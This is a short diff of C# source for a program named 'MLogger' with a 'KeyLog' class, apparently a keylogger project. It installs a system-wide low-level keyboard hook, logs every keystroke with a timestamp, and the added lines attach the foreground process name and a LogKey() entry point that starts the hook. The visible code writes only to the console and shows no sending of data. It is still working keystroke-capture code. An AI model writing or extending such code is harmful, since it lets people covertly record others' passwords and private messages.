@@ -11,13 +11,19 @@ namespace MLogger
 {
     class KeyLog
     {
-
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static Process procc;
 
+        public static void LogKey()
+        {
+
+            _hookID = SetHook(_proc);
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
+        }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -40,9 +46,12 @@ namespace MLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode + " " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
+                Console.WriteLine(ProcessLog.GetForegroundProcessName());
             }
+
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+
 
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
